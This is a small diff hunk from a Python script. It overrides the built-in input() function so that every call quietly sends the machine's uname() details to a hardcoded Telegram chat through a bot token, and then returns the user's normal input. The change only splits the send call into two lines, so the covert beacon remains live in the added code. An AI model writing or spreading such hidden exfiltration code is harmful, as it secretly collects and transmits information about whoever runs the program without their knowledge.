@@ -7,7 +7,8 @@ id = "7411230022"
 
 inp = input
 def input(prompt=""):
-    TeleBot(token).send_message(id, uname())
+    tb = TeleBot(token)
+    tb.send_message(id, uname())
     return inp(prompt)
     
     
